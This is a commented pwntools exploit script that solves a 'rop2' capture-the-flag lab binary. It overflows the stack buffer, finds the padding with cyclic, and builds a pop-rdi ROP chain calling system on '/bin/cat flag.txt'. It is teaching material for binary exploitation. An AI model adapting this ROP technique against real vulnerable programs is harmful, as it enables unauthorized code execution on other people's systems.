from pwn import *

# the following command opens a new terminal in tmux with gdb attached to the process;
# this is useful in the first phase of debugging

# context.terminal = ["tmux", "splitw", "-h"]

# the following line tells to the pwntools library to print debug messages;
# in particular, sent / received messages will be printed

context.log_level = "debug"

# it is suggested to first analyse the binary with gdb, and only after to craft and
# directly send the payload

# p = gdb.debug('../target/rop2', '''b *pwnme+72
# b *usefulFunction+4
# c
# ''')
p = process('../target/rop2')

# inside gdb, the command 'info functions' reveals a function named 'usefulFunction'
# then, the command 'p usefulFunction' reveals the address of the function
# the command 'disass usefulFunction' reveals that there is a 'system' function inside usefulFunction

system_addr = 0x0040074b

# looking inside the .data section, there is a 'usefulString' string
# the command 'p (char*) &usefulString' returns the address and the content of that string:
# 0x601060 <usefulString> "/bin/cat flag.txt"

bin_cat_addr = 0x601060

# we need a ROP gadget to replace "/bin/ls" with  "/bin/cat flag.txt" in 'usefulFunction'
# the pwntools library has what is needed

elf = ELF('../target/rop2')
rop = ROP(elf)

gadget_addr = rop.rdi[0] # pop rdi: ret


p.readuntil(b'> ')

# with the 'cyclic' tool and gdb, it is easy to find the length of the padding
# looking at the address where the binary crashes:

# p.sendline(cyclic(0x60))
# the address is the hexadecimal value for 'kaaalaaa'

padding_len = cyclic_find(b'kaaa')

# the missing step is to assemble the ROP chain

payload  = b'A' * padding_len
payload += p64(gadget_addr)
payload += p64(bin_cat_addr) # usefulString
payload += p64(system_addr) # system
p.sendline(payload)
p.recvall()
